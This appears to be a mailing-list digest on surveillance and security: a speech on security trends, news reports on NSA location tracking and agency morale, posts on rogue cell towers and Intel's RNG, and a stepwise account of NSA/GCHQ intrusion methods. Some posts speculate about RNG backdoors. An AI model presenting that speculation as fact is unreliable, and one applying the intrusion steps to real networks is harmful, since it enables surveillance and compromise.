emergent behavior.  The lowliest Internet user is entirely in the
game of interdependence -- one web page can easily touch scores of
different domains.  While writing this, the top level page from
cnn.com had 400 out-references to 85 unique domains each of which
is likely to be similarly constructed and all of which move data
one way or another.  If you leave those pages up and they have an
auto-refresh, then moving to a new network signals to every one of
those ad networks that you have so moved.
The wellspring of risk is dependence, especially dependence on
shared expectations of shared system state, i.e., interdependence
on the ground.  If you would accept that you are most at risk from
the things you most depend upon, then damping dependence is the
cheapest, most straightforward, lowest latency way to damp risk,
just as the fastest and most reliable way to put more money on a
business's bottom line is through cost control.
Trend  Automation
Shoshana Zuboff of the Harvard Business School notably described
three laws of the digital age,
. Everything that can be automated will be automated.
. Everything that can be informated will be informated.
. Every digital application that can be used for surveillance and
.    control will be used for surveillance and control.
It is irrelevant, immaterial and incompetent to argue otherwise.
For security technology, Zuboff's Laws are almost the goal state,
that is to say that the attempt to automate information assurance
is in full swing everywhere, the ability to extract information
from the observable is in full swing everywhere, and every digital
application is being instrumented.
Before In-Q-Tel, I worked for a data protection company.  Our product
was, and I believe still is, the most thorough on the market.  By
"thorough" I mean the dictionary definition, "careful about doing
something in an accurate and exact way."  To this end, installing
our product instrumented every system call on the target machine.
Data did not and could not move in any sense of the word "move"
without detection.  Every data operation was caught and monitored.
It was total surveillance data protection.  What made this product
stick out was that very thoroughness, but here is the point: Unless
you fully instrument your data handling, it is not possible for you
to say what did not happen.  With total surveillance, and total
surveillance alone, it is possible to treat the absence of evidence
as the evidence of absence.  Only when you know everything that
*did* happen with your data can you say what did *not* happen with
your data.
But this trend of automating is now leaving the purely defensive
position behind.  In a press release two weeks ago today,[7] DARPA
signaled exactly that, and I quote
   [T]he Defense Advanced Research Projects Agency intends to hold
   the Cyber Grand Challenge -- the first-ever tournament for fully
   automatic network defense systems.  DARPA envisions teams creating
   automated systems that would compete against each other to
   evaluate software, test for vulnerabilities, generate security
   patches and apply them to protected computers on a network.  The
   growth trends ... in cyber attacks and malware point to a future
   where automation must be developed...
The automation trend is irreversible, but it begs a question that
I fear no one will answer in a way that doesn't merely reflect their
corporate or institutional interest, namely are people in the loop
a failsafe or a liability?[8]
Trend  Dual use
I've become convinced that all security technology is dual use.
While I am not sure whether dual use is a trend or a realization
of an unchanging fact of nature, the obviousness of dual use seems
greatest in the latest technologies, so I am calling it a trend in
the sense that the straightforward accessibility of dual use
characteristics of new technology is a growing trend.
There are a lot of examples, but in the physical world any weapon
usable for defense can be repurposed for offense.  Every security
researcher looking for exploitable flaws is deep in the dual use
debate because once discovered, those flaws can be patched or they
can be sold.  The cyber security products that promise total
surveillance over the enterprise are, to my mind, an offensive
strategy used for defensive purposes.
There was a time when flaws were predominantly found by adventurers
and braggarts.  Ten plus years of good work by the operating system
vendors elbowed the flaw finders out of the operating system and,
as a result, our principal opponents changed over from adventurers
and braggarts to being professionals.  Finding vulnerabilities and
exploiting them is now hard enough that it has moved out of the
realm of being a hobby and into the realm of being a job.  This
changed several things, notably that braggarts share their findings
because they are paid in bragging rights.  By contrast, professionals
do not share and are paid in something more substantial than fame.
The side effect has been a continued rise in the percentage of all
vulnerabilities that are previously unknown.  The trend, in other
words, is that by crushing hobbyists we've raised the market price
of working exploits to where now our opponents pay for research and
development out of revenue.
Simulating what the opponent can do thus remains the central task
of defensive research.  Much of that research is in crafting proofs
of concept that such and such a flaw can be taken advantage of.
Corman's neologism of "HD Moore's Law" says that the trend in the
power of the casual attacker grows as does the trend of the power
in Metasploit.[9] It is hard to think of a better description of
dual use.
Trend  The blurring of end-to-end
To my mind, the most important technical decision ever made was
that the security of the Internet was to be "end-to-end."[10]
"End-to-end" is a generic technical term yet simple to explain: the
Internet was built on the premise that two entities could connect
themselves to each other and decide what they wanted to do.  The
network was a delivery vehicle, but the form, content, and security
of the connection between the two ends was to be their own choice.
End-to-end is a model where the terminal entities are smart and the
network is dumb.  This is completely (completely) different than a
smart network with dumb terminal entities at the end of the wire.
No other design decision of the Internet comes close to the importance
of it's being an end-to-end design.  With end-to-end, security is
the choice of the terminal end-points, not something built into the
fabric of the Internet itself.  That is American values personified.
It is the idea that accountability, not permission seeking, is the
way a government curbs the misuse of freedoms, and, as accountability
scales but permission seeking does not, accountability wins.
End-to-end security is the digital manifestation of the right of
association and, in any case, is what enabled the Internet to become
relevant in the first place.  End-to-end does precisely what Peter
Drucker told us to do: "Don't solve problems, create opportunities."
The provision of content from anywhere to anywhere, which is the
very purpose of an internetwork, is a challenge to sovereignty.
America's Founders wanted no sovereign at all, and they devised a
government that made the center all but powerless and the periphery
fully able to thumb its nose at whatever it felt like.  Much ink
has been spilled on the frontier ethic versus the wishful policies
favored by the comfortable urbanity of the welfare state, but the
Internet's protocols have everything in common with the former and
nothing in common with the latter.
The free man requires the choice of with what degree of vigor to
defend himself.  That is a universal; America's Founders laid that
down in the Second Amendment, just as did George Orwell in the
English democratic socialist weekly "Tribune" when he said, "That
rifle on the wall of the laborer's cottage or working class flat
is the symbol of democracy.  It is our job to see that it stays
there."  Were George Washington or George Orwell still among us,
they would know that smart end-points and dumb networks are what
freedom requires, that smart networks protecting dumb end-points
breed compliant dependency.
But the trend is otherwise, and not just because of the fatuous
fashionability of entitlement, but rather because of a blurring of
what the term "end" means.  So very many people have adopted automatic
synchronization of multiple devices they own that one has to ask
whether their tablet is an end or their collection of mutually
synchronized devices is an end.  So many Internet-dependent functions
are spread silently across numerous entities and applications that
what is the end may well be more dynamic than can be described.  If
an end implies unitary control on the part of an owner, then set
theory says that mutually synchronized devices are a unitary end.
That blurring of "end" makes end-to-end provisioning problematic
as a set of devices cannot be assumed to be equally on and equally
participating in any given transaction.  Quoting Clark & Blumenthal[11]
   There is a risk that the range of new requirements now emerging
   could have the consequence of compromising the Internet's original
   design principles.  Were this to happen, the Internet might lose
   some of its key features, in particular its ability to support
   new and unanticipated applications.  We link this possible outcome
   to a number of trends: the rise of new stakeholders in the
   Internet,...  new government interests, the changing motivations
   of the growing user base, and the tension between the demand for
   trustworthy overall operation and the inability to trust the
   behavior of individual users.
This is nowhere so evident as in security, that is to say in the
application of the end-to-end principle to cyber security.  What
does end-to-end secure transport mean when travelocity.com is showing
you a page dynamically constructed from a dozen other entities?
Trend  Complexity in the supply chain
Even without resorting to classified information, it is now clear
that supply chain attacks have occurred.  Whether reading journalistic
accounts or Richard Clarke's novel _Breakpoint_, the finding is
that the supply chain creates opportunities for badness.  None of
the things I've yet read, however, blames the supply chain risk on
its complexity, per se, but that is the trend that matters.
Security is non-composable -- we can get insecure results even when
our systems are assembled from secure components.  The more components,
the less likely a secure result.  This applies to supply chains
that are growing ever more complex under the pressure of just-in-time,
spot market sourcing of, say, memory chips and so forth and so on.
Because the attacker has only to find one component of that chain
to be vulnerable while the defender has to assure that all components
are invulnerable, rising supply chain complexity guarantees increased
opportunity for effective attack.  It cannot do otherwise, and the
trend is clear.
Trend  Monoculture(s)
Beginning with Forrest in 1997,[12] regular attention has been paid
to the questions of monoculture in the network environment.  There
is no point belaboring the fundamental question, but let me state
it for the record: cascade failure is so very much easier to detonate
in a monoculture -- so very much easier when the attacker has only
to write one bit of malware, not ten million.  The idea is obvious;
believing in it is easy; acting on its implications is, evidently,
rather hard.
I am entirely sympathetic to the actual reason we continue to deploy
computing monocultures -- making everything almost entirely alike
is, and remains, our only hope for being able to centrally manage
it in a consistent manner.  Put differently, when you deploy a
computing monoculture you are making a fundamental risk management
decision: That the downside risk of a black swan event is more
tolerable than the downside risk of perpetual inconsistency.  This
is a hard question, as all risk management is about changing the
future, not explaining the past.  Which would you rather have, the
unlikely event of a severe impact, or the day-to-day burden of
perpetual inconsistency?
When we opt for monocultures we had better opt for tight central
control.  This supposes that we are willing to face the risks that
come with tight central control, of course, including the maximum
risk of all auto-update schemes, namely the hostile takeover of the
auto-update mechanism itself.  Computer desktops are not the point;
embedded systems are.  The trendline in the number of critical
monocultures seems to be rising and many of these are embedded
systems both without a remote management interface and long lived.
That combination -- long lived and not reachable -- is the trend
that must be reversed.  Whether to insist that embedded devices
self destruct at some age or that remote management of them be a
condition of deployment is the question.  In either case, the
Internet of Things and the appearance of microcontrollers in seemingly
every computing device should raise hackles on every neck.[13]
Trend  Attack surface growth versus skill growth
Everyone here knows the terminology "attack surface" and knows that
one of the defender's highest goals is to minimize the attack surface
wherever possible.  Every coder adhering to a security-cognizant
software lifecycle program does this.  Every company or research
group engaged in static analysis of binaries does this.  Every
agency enforcing a need-to-know regime for data access does this.
Every individual who reserves one low-limit credit card for their
Internet purchases does this.  I might otherwise say that any person
who encrypts their e-mail to their closest counterparties does this,
but because consistent e-mail encryption is so rare, encrypting
one's e-mail marks it for collection and indefinite retention by
those entities in a position to do so, regardless of what country
you live in.
In cyber security practice, the trend is that we practitioners as
a class are getting better and better.  We have better tools, we
have better understood practices, and we have more colleagues.
That's the plus side.  But I'm interested in the ratio of skill to
challenge, and as far as I can estimate, we are expanding the
society-wide attack surface faster than we are expanding our
collection of tools, practices, and colleagues.  If you are growing
more food, that's great.  If your population is growing faster than
your improvements in food production can keep up, that's bad.
In the days of radio, there was Sarnoff's Law, namely that the value
of a broadcast network was proportional to N, the number of listeners.
Then came packetized network communications and Metcalfe's Law,
that the value of a network was proportional to N squared, the
number of possible two-way conversations.  We are now in the era
of Reed's Law where the value of a network is proportional to the
number of groups that can form in it, that is to say 2 to the power
N.  Reed's Law is the new reality because it fits the age of social
networks.  In each of these three laws as publicly stated, the sign
bit is positive, but in parallel with the claim that everything is
dual use, the sign bit can also be negative because interconnections
are a contributor to the net attack surface.  If an Internet of
Things is indeed imminent, then the upward bend in the curve of the
global attack surface will grow steeper regardless of what level
of risk there is for any one thing so long as that level of risk
is always non-zero.
Trend  Specialization
Everyone my age working in cyber security was trained for something
else, and because of that switch between one field and another
brings along the hybrid vigor of seeing the cyber security world
through a different lens.  Statisticians, civil engineers, and
lawyers alike can contribute.  But the increasing quality of prepatory
education, the increasing breadth of affairs for which cyber security
is needful, and the increasing demand for skill of the highest sort
means the humans in the game are specializing.
While some people like to say "Specialization is for insects," tell
me that the security field itself is not specializing.  We have
people who are expert in forensics on specific operating system
localizations, expert in setting up intrusion response, expert in
analyzing large sets of firewall rules using non-trivial set theory,
expert in designing egress filters for universities that have no
ingress filters, expert in steganographically watermarking binaries,
and so forth.  Generalists are becoming rare, and they are being
replaced by specialists.  This is biologic speciation in action,
and the narrowing of ecologic niches.  In rough numbers, there are
somewhere close to 5,000 various technical certifications you can
get in the computer field, and the number of them is growing thus
proving the conjecture of specialization and speciation is not just
for insects and it will not stop.

NSA tracking cellphone locations worldwide, Snowden documents show
By Barton Gellman and Ashkan Soltani, Wednesday, December 4, 12:18 PM
The National Security Agency is gathering nearly 5 billion records a
day on the whereabouts of cellphones around the world, according to
top-secret documents and interviews with U.S. intelligence officials,
enabling the agency to track the movements of individuals — and map
their relationships — in ways that would have been previously
The records feed a vast database that stores information about the
locations of at least hundreds of millions of devices, according to
the officials and the documents, which were provided by former NSA
contractorEdward Snowden. New projects created to analyze that data
have provided the intelligence community with what amounts to a mass
surveillance tool.
(Video: How the NSA uses cellphone tracking to find and ‘develop’ targets)
The NSA does not target Americans’ location data by design, but the
agency acquires a substantial amount of information on the whereabouts
of domestic cellphones “incidentally,” a legal term that connotes a
foreseeable but not deliberate result.
One senior collection manager, speaking on condition of anonymity but
with permission from the NSA, said “we are getting vast volumes” of
location data from around the world by tapping into the cables that
connect mobile networks globally and that serve U.S. cellphones as
well as foreign ones. Additionally, data is often collected from the
tens of millions of Americans who travel abroad with their cellphones
every year.
In scale, scope and potential impact on privacy, the efforts to
collect and analyze location data may be unsurpassed among the NSA
surveillance programsthat have been disclosed since June. Analysts can
find cellphones anywhere in the world, retrace their movements and
expose hidden relationships among individuals using them.
(Graphic: How the NSA is tracking people right now)
U.S. officials said the programs that collect and analyze location
data are lawful and intended strictly to develop intelligence about
foreign targets.
Robert Litt, general counsel for the Office of the Director of
National Intelligence, which oversees the NSA, said “there is no
element of the intelligence community that under any authority is
intentionally collecting bulk cellphone location information about
cellphones in the United States.”
The NSA has no reason to suspect that the movements of the
overwhelming majority of cellphone users would be relevant to national
security. Rather, it collects locations in bulk because its most
powerful analytic tools — known collectively as CO-TRAVELER — allow it
to look for unknown associates of known intelligence targets by
tracking people whose movements intersect.
Still, location data, especially when aggregated over time, is widely
regarded among privacy advocates as uniquely sensitive. Sophisticated
mathematical techniques enable NSA analysts to map cellphone owners’
relationships by correlating their patterns of movement over time with
thousands or millions of other phone users who cross their paths.
Cellphones broadcast their locations even when they are not being used
to place a call or send a text.
(Video: Reporter Ashkan Soltani explains NSA collection of cellphone data)
CO-TRAVELER and related tools require the methodical collection and
storage of location data on what amounts to a planetary scale. The
government is tracking people from afar into confidential business
meetings or personal visits to medical facilities, hotel rooms,
private homes and other traditionally protected spaces.
“One of the key components of location data, and why it’s so
sensitive, is that the laws of physics don’t let you keep it private,”
said Chris Soghoian, principal technologist at the American Civil
Liberties Union. People who value their privacy can encrypt their
e-mails and disguise their online identities, but “the only way to
hide your location is to disconnect from our modern communication
system and live in a cave.”
The NSA cannot know in advance which tiny fraction of 1 percent of the
records it may need, so it collects and keeps as many as it can — 27
terabytes, by one account, or more than double the text content of the
Library of Congress’s print collection.
The location programs have brought in such volumes of information,
according to a May 2012 internal NSA briefing, that they are
“outpacing our ability to ingest, process and store” data. In the
ensuing year and a half, the NSA has been transitioning to a
processing system that provided it with greater capacity.
The possibility that the intelligence community has been collecting
location data, particularly of Americans, has long concerned privacy
advocates and some lawmakers. Three Democratic senators — Ron Wyden
(Ore.), Mark Udall (Colo.) and Barbara Mikulski (Md.) — have
introduced an amendment to the 2014 defense spending bill that would
require U.S. intelligence agencies to say whether they have ever
collected or made plans to collect location data for “a large number
of United States persons with no known connection to suspicious
NSA Director Keith Alexander disclosed in Senate testimony in October
that the NSA had run a pilot project in 2010 and 2011 to collect
“samples” of U.S. cellphone location data. The data collected were
never available for intelligence analysis purposes, and the project
was discontinued because it had no “operational value,” he said.
Alexander allowed that a broader collection of such data “may be
something that is a future requirement for the country, but it is not
right now.”
The number of Americans whose locations are tracked as part of the
NSA’s collection of data overseas is impossible to determine from the
Snowden documents alone, and senior intelligence officials declined to
offer an estimate.
“It’s awkward for us to try to provide any specific numbers,” one
intelligence official said in a telephone interview. An NSA
spokeswoman who took part in the call cut in to say the agency has no
way to calculate such a figure.
An intelligence lawyer, speaking with his agency’s permission, said
location data are obtained by methods “tuned to be looking outside the
United States,” a formulation he repeated three times. When U.S.
cellphone data are collected, he said, the data are not covered by the
Fourth Amendment, which protects Americans against unreasonable
searches and seizures.
According to top-secret briefing slides, the NSA pulls in location
data around the world from 10 major “sigads,” or signals intelligence
activity designators.
A sigad known as STORMBREW, for example, relies on two unnamed
corporate partners described only as ARTIFICE and WOLFPOINT. According
to an NSA site inventory, the companies administer the NSA’s “physical
systems,” or interception equipment, and “NSA asks nicely for
STORMBREW collects data from 27 telephone links known as OPC/DPC
pairs, which refer to originating and destination points and which
typically transfer traffic from one provider’s internal network to
another’s. That data include cell tower identifiers, which can be used
to locate a phone’s location.
The agency’s access to carriers’ networks appears to be vast.
“Many shared databases, such as those used for roaming, are available
in their complete form to any carrier who requires access to any part
of it,” said Matt Blaze, an associate professor of computer and
information science at the University of Pennsylvania. “This ‘flat’
trust model means that a surprisingly large number of entities have
access to data about customers that they never actually do business
with, and an intelligence agency — hostile or friendly — can get ‘one
stop shopping’ to an expansive range of subscriber data just by
compromising a few carriers.”
Some documents in the Snowden archive suggest that acquisition of U.S.
location data is routine enough to be cited as an example in training
materials. In an October 2012 white paper on analytic techniques, for
example, the NSA’s counterterrorism analysis unit cites two U.S.-based
carriers to illustrate the challenge of correlating the travels of
phone users on different mobile networks. Asked about that, a U.S.
intelligence official said the example was poorly chosen and did not
represent the program’s foreign focus.
The NSA’s capabilities to track location are staggering, based on the
Snowden documents, and indicate that the agency is able to render most
efforts at communications security effectively futile.
Like encryption and anonymity tools online, which are used by
dissidents, journalists and terrorists alike, security-minded behavior
— using disposable cellphones and switching them on only long enough
to make brief calls — marks a user for special scrutiny. CO-TRAVELER
takes note, for example, when a new telephone connects to a cell tower
soon after another nearby device is used for the last time.
Side-by-side security efforts — when nearby devices power off and on
together over time — “assist in determining whether co-travelers are
associated … through behaviorally relevant relationships,” according
to the 24-page white paper, which was developed by the NSA in
partnership with the National Geospatial Agency, the Australian
Signals Directorate and private contractors.
A central feature of each of these tools is that they do not rely on
knowing a particular target in advance, or even suspecting one. They
operate on the full universe of data in the NSA’s FASCIA repository,
which stores trillions of metadata records, of which a large but
unknown fraction include locations.
The most basic analytic tools map the date, time, and location of
cellphones to look for patterns or significant moments of overlap.
Other tools compute speed and trajectory for large numbers of mobile
devices, overlaying the electronic data on transportation maps to
compute the likely travel time and determine which devices might have
To solve the problem of undetectable surveillance against CIA officers
stationed overseas, one contractor designed an analytic model that
would carefully record the case officer’s path and look for other
mobile devices in steady proximity.
“Results have not been validated by operational analysts,” the report said.

NSA morale down after Edward Snowden revelations, former U.S. officials say
By Ellen Nakashima, Published: December 7
Morale has taken a hit at the National Security Agency in the wake of
controversy over the agency’s surveillance activities, according to
former officials who say they are dismayed that President Obama has
not visited the agency to show his support.
A White House spokeswoman, Caitlin Hayden, noted that top White House
officials have been to the agency to “express the president’s support
and appreciation for all that NSA does to keep us safe.”
It is not clear whether or when Obama might travel the 23 miles up the
Baltimore-Washington Parkway to visit Fort Meade, the NSA’s
headquarters in Maryland, but agency employees are privately voicing
frustration at what they perceive as White House ambivalence amid the
pounding the agency has taken from critics.
An NSA spokeswoman had no comment.
Obama in June defended the NSA’s surveillance as lawful and said he
welcomed the public debate prompted by revelations from former
contractor Edward Snowden beginning that month.
Though Obama has asserted, for instance, that the NSA’s collection of
virtually all Americans’ phone records is lawful and has saved lives,
the administration has not endorsed legislation that would codify it.
And his recent statements suggest he thinks some of the NSA’s
activities should be constrained.
A senior administration official who was not authorized to speak on
the record said that the White House would normally not endorse
legislation so early in the process but that “it’s been clear . . .
that we prefer legislation” that preserves the phone records program
“while making some changes . . . to potentially strengthen oversight
and transparency.”
Said Hayden: “The president has the highest respect for and pride in
the men and women of the intelligence community who work tirelessly to
protect our nation. He’s expressed that directly to NSA’s leadership
and has praised their work in public. As he said: ‘The men and women
of our intelligence community work every single day to keep us safe
because they love this country and believe in our values. They’re
patriots.’ ”
She noted that in recent weeks, Lisa Monaco, assistant to the
president for homeland security and counterterrorism, and Denis
McDonough, the White House chief of staff, visited Fort Meade “to
express the president’s support and appreciation for all that NSA does
to keep us safe.”’
Supporters of the NSA say staffers are not feeling the love.
“The agency, from top to bottom, leadership to rank and file, feels
that it is had no support from the White House even though it’s been
carrying out publicly approved intelligence missions,” said Joel
Brenner, NSA inspector general from 2002 to 2006. “They feel they’ve
been hung out to dry, and they’re right.”
A former U.S. official — who like several other former officials
interviewed for this story requested anonymity because he still has
dealings with the agency — said: “The president has multiple
constituencies — I get it. But he must agree that the signals
intelligence NSA is providing is one of the most important sources of
intelligence today.
“So if that’s the case, why isn’t the president taking care of one of
the most important elements of the national security apparatus?”
The White House, observers say, is caught between competing desires to
preserve what it has said are valuable national security programs and
to shield the president from criticism from allies abroad and
civil-liberties advocates at home.
Some observers said it is not surprising that Obama would not travel
to Fort Meade before internal and external reviews of surveillance
activities have been completed. The reviews are expected to be done
The NSA’s director, Gen. Keith Alexander, who is retiring in the
spring after 81 / 2 years, has been the most vocal defender of the
agency’s 35,000 employees. In speeches he has noted that more than
6,000 of them went to Iraq and Afghanistan to support the military. He
has spoken of how 22 cryptologists were killed. “They’re the heroes —
not the media leaker,” he said in a September speech, in a reference
to Snowden.
NSA counterterrorism analysts have worked “every weekend for eight
years since I’ve been here. . . . Twenty-four hours a day, seven days
a week, they’re there to defend us,” he said then.
On Thursday, Obama said on MSNBC that he would be proposing “some
self-restraint on the NSA” and “some reforms that can give people more
In an interview with NBC last month, he said: “In some ways, the
technology and the budgets and the capacity [at NSA] have outstripped
the constraints. And we’ve got to rebuild those in the same way that
we’re having to do on a whole series of capacities . . . [such as]
drone operations.”
Civil-liberties advocates generally agree with that sentiment, but
they would go further and say that the NSA’s bulk collection of
domestic phone records is unlawful and ought to be ended.
Former officials note how President George W. Bush paid a visit to the
NSA in January 2006, in the wake of revelations by the New York Times
that the agency engaged in a counterterrorism program of warrantless
surveillance on U.S. soil beginning after the Sept. 11, 2001,
terrorist attacks. “Bush came out and spoke to the workforce, and the
effect on morale was tremendous,” Brenner said. “There’s been nothing
like that from this White House.”
A second former official said NSA workers are polishing up their
résumés and asking that they be cleared — removing any material linked
to classified programs — so they can be sent out to potential
employers. He noted that one employee who processes the résumés said,
“I’ve never seen so many résumés that people want to have cleared in
my life.”
Morale is “bad overall,” a third former official said. “The news — the
Snowden disclosures — it questions the integrity of the NSA
workforce,” he said. “It’s become very public and very personal.
Literally, neighbors are asking people, ‘Why are you spying on
Grandma?’ And we aren’t. People are feeling bad, beaten down.”

i feel your pain...
sort of; there are some interesting attacks using a force-pushed
silent PRL update (see DC19/DC20 cell attacks threads) which would be
observable by tower ID oddities, not to mention decremented or zero
PRL version.  however, you'd have to be paying attention (who checks
their PRL regularly? :).
if you simply check if a tower is in
 for example, you're open to
attacks spoofing a legitimate but remote (out of range) tower.
using direction finding techniques to cross reference the transmitter
location against the expected GPS coordinates in a tower database
relative to your position would also detect these tower impersonators,
but requires more hardware than a mobile baseband...
the expensive, limited distribution kit will be hard to distinguish
without a high performance software defined radio.  if you're able to
detect an identically spoofed tower using OsmocomBB with high
confidence i'd love to know how you did it!
truth.  also, an inversion of observed data link capacity (suddenly
seeing receive bandwidth drop in half or more while transmit rate
doubles) is no bueno.

I think there may be weaknesses in Intel's hardware RNG.  I took a
good look at Intel's hardware random number generator source. There's
a paper analyzing it here:
The basic idea is that back-to-back inverters, when powered on, flip
one way or the other randomly, sort of like DRAM memory when our
computer's power on.  By powering on a single pair of back-to-back
inverters over and over, they can generate a random bit per cycle, at
about 3 Giga-bits/second, which is amazing!  Here's my concerns about
the the paper:
- I saw no mathematical analysis of how much noise exists in the
system and how strongly it will influence the result each cycle. There
were generalities about how the noise could cause the output to be
random, but no numbers at all.
- There is an assumption that the capacitors are charged/discharged by
10% of the standard deviation of the noise.  I saw no justification
for this.  It seems they simply assumed best case.
- The paper is about as objective as a mother talking about her
children.  For example: "Overall, the Ivy Bridge RNG is a robust
design with a large margin of safety that ensures good random data is
generated even if the ES is not operating as well as predicted." Based
on what?
- I am not convinced they have the right model for the entropy source.
 They add noise to the bias on the capacitors, and compare that to 0
to determine the next output bit in their model.  I think the main
source of noise may be the randomness in number of electrons
added/subtracted each cycle, and that the back-to-back inverters in
the absence of other noise may be acting almost as an ideal
comparator.  However, if this were the case, even if there were 10%
noise in the number of electrons, there would be considerable
correlation between bits.
I also have questions about the design itself.  My main concern is
that noise on the VDD rail could easily determine the output.  For
example, if the transistors are mismatched, which of course they will
be, and the bias is set exactly right on the caps so there's a 50-50
chance of a 0 or 1, and suddenly VDD drops 10% due to a rising edge of
the the main system clock, then the inverter with higher gate
thresholds will become weak faster than the other one, thus
determining which one wins.  Since this circuit runs asynchronously
from the main system clock, I could easily see the 3MHz system clock
phase relative to the entropy generator clock determining most of the
results from the entropy source, while looking fairly random. Any
weakness in the raw random data stream is hidden from us by the AES
encryption done as a post-process.
I simulated back-to-back inverters in my .35u low power CMOS process
in SPICE to see if I could figure out how to make a practical circuit
using Intel's topology.  If it works, it would be fantastic.  I think
I can get rid of most of the supply noise issues.  I had a similar
problem in my "Infinite Noise Multiplier", so I switched to powering
the circuit with nothing but large W and L constant current sources,
and using the range from 0V to Vref, rather than 0V to VDD, because
Vref is stable relative to AVSS. However, I wasn't able to get enough
noise to make Intel's ciruit work, though that may be due to
limitations in the SPICE simulator.
Has anyone else had success using Intel's RNG topology?

I have to take back my criticism of Intel's RNG.  I got my sims
working for a version of their architecture in .35u CMOS, and it's
simply better than my "Infinite Noise Multiplier".  It's probably the
best true random noise generator ever.  I still don't like how their
schematic is seems highly sensitive to supply noise, but we don't know
what the actual circuit looks like.  Intel hasn't told us.
So, I'm going to modify it a bit to use the resistors available on my
chip and reduce the caps, fix the supply sensitivity, and I think I
can run 16 of these things in parallel at 100-200MHz on the tiny .35u
CMOS chip I'm designing.  I'll spit out the raw waveforms from the
inverters, buffered once, through 16 "analog" pins, so there wont be
any fear (hopefully) that I'm cooking the data on-chip, before you can
see it, and I'll open-source the schematics.  If there's a circuit
that can consume all 1.6Gbit/sec of this raw data, have fun with it!
On the digital side, I'll XOR bits together to get the bandwidth down
to something reasonable, which I can send over USB, and provide a
simple Linux driver.
This thing will definitely put out RF, but since I'm making the raw
data available at the pins, should I care?  By the way, this is just a
for-fun project at work.  I get to do a free chip design :-)

the partnership with NGA to deploy them gives a hint: this is putting
USRPs up close and personal to target for exploitation.
(the USRP's are definitely more portable than my favorite SDR, the Noctar[0]!)
given the obtained bits mentioned (WLLids, DSL accounts, Cookies,
GooglePREFIDs) gathered and then handed off to TAO for further QUANTUM
INSERT fucking of target systems it is likely they are doing GSM/cell
MitM to observe identifiers, along with WiFi attacks, and other egress
rather than deploying baseband exploits or deep active attacks
directly against the devices or other networks they're communicating
thus CNE in this case is cell MitM/WiFi pwn with a USRP rogue tower to
get identifiers for TAO.  and TAO is where they get dirty with "remote
exploitation" of the device itself and other targets on networks it
we've seen how they have a smorgasbord of weaponized exploits to cover
the gamut of target hardware and technical acumen in the QUANTUM
INSERT / TURMOIL / TRAFFICTHIEF / MUTANT BROTH / etc, etc. style
efforts.  it appears they're using this same infrastructure where
possible for mobile; restricting CNE on the ground only to target.

see also this section on the OPEC hacks:
Here’s how the NSA and GCHQ go after an organization like OPEC step by
step, based on an analysis of the NSA and GCHQ documents exposed by
Step 1: Identify. Using the NSA-built packet capture and inspection
system called TURMOIL, the agencies filter through Internet traffic at
a network choke point looking for specific "fingerprints" in traffic
that identify users with the organization being targeted. Data from
TURMOIL gets pulled into a number of traffic analysis tools, such as
XKeyscore and TRAFFICTHIEF, which do different sorts of packet
XKeyscore is the NSA's distributed search engine, catching a large
chunk of international Internet traffic for analysis. It helps find
things deep in the clutter of the Internet that analysts might miss by
allowing them to use search terms to find things in both live and
cached Internet traffic.
TRAFFICTHIEF, on the other hand, is much more focused. It filters for
very "strong" indicators, like known sets of IP addresses, addresses
within e-mail traffic, or user names in logins to social networks or
other services. It provides less depth of analysis than XKeyscore, but
it can handle much larger loads of data because it is more selective
about what it processes.
Together, the tools can be used to identify the systems used by an
individual or organization, including ranges of addresses that they
may use from work or home.
Step 2: Target. Using the profiles built using the surveillance tools,
the agencies can then identify potential points of attack. XKeyscore,
for example, can be used to search for patterns that identify known
security vulnerabilities within a range of addresses. Web visit
histories, e-mail traffic, and other data are analyzed looking for the
most likely (and least detectable) approach to gain access, and a
specific attack plan is crafted, including the identification of where
to launch the attack from.
At the NSA, this sort of thing is the work of Tailored Access
Operations. In the case of OPEC, the targeting process apparently went
on for several years as the NSA sought openings for an attack.
Step 3: Attack. Depending on who the target is, the NSA and GCHQ have
a variety of options. The least costly is to use access provided by
one of the intelligence agencies' telecommunications "partners" who
own network equipment at an exchange or other choke point that the
target's Internet traffic passes through. The agency running the
attack can use that access to introduce changes to Internet routing
tables that detour the targeted individual's traffic. But in some
cases, the NSA and GCHQ may have to perform "unilateral" taps on
network backbones to gain that level of access—targeting a piece of
network hardware to take over or splicing directly into the target's
own connection to the Internet.
It's not clear which attack the NSA used to gain access to OPEC's
systems, though the GCHQ used a Quantum attack two years later to gain
its own very special access to the cartel's network. In the case of
the Belgacom hack, the GCHQ used a Quantum insert attack—routing the
Web requests for LinkedIn and Slashdot from the engineer being
targeted to a server posing as those sites. The NSA has used the same
approach to intercept traffic to sites such as Google.
The man-in-the-middle server can present content from the actual sites
the target intended to visit, but it can also add content to the
traffic, using what's called packet injection—modifying the contents
of the data as it passes through—and intercept the user's credentials.
And by using a forged certificate, the NSA can intercept encrypted
traffic intended for the destination site.
Once the user has connected to the fake server, the intelligence
agencies can use the connection to launch attacks against the target's
Web browser to install monitoring software or other malware, using
similar techniques to those used by hackers. They can also use
credentials exposed via the man-in-the-middle attack to gain access to
other accounts owned by the target and to troll through connections in
those services that might be potential targets.
Step 4: Exploit. Once the target's computer has been successfully
attacked, the effort begins to look much like that of the Chinese
cyber warriors' attack of the New York Times or what cyber criminals
typically do when they score access to high-value targets. The
agencies' hackers work to stealthily expand their level of access,
using customized remote administration tools to grab user privileges
and gain access to other network resources—mail servers, file servers,
and other network systems. They then start to "exfiltrate" data from
these systems and deliver them to analysts.

Ivy Bridge is the codename for a line of processors based on the 22 nm
manufacturing process developed by Intel. The name is also applied
more broadly to the 22 nm die shrink of the Sandy Bridge
microarchitecture based on FinFET ("3D") tri-gate transistors, which
is also used in the Xeon andCore i7 Ivy Bridge-EX (Ivytown), Ivy
Bridge-EP and Ivy Bridge-E microprocessors released in 2013.

"used in Virtual Private Network" == PPTP,IPsec,OpenVPN,etc.
"Web encryption devices" == in my interpretation, this is any targeted
hardware with the vulnerable chip.  it could be a tablet, a desktop,
and rack mount server...  any of these platforms could speak VPN or
Web crypto.  TAO/SCS do like to get into the switches though ;)
mostly "cloud infrastructure", "software defined data center", and the like:
back in the day, Sun got tired of the (relatively) slow performance
and latency of crypto offloading via bus and simply threw it into the
core.  you were still offloading crypto, but within the CPU.
also note that endpoint compromises sufficient to decrypt VPN or
secure web traffic is already present in TAO/CNE's tasking.  this
effort [CCP_00009] may focus on VPN concentrator / secure web proxy
deployments specifically to handle the RDRAND lookup per their private
starting counter.
previous back doors have also used entropy leakage sufficient to bring
a brute force attack into reasonable effort, while still denying third
parties a class break of the entropy / keys used.  this type of key
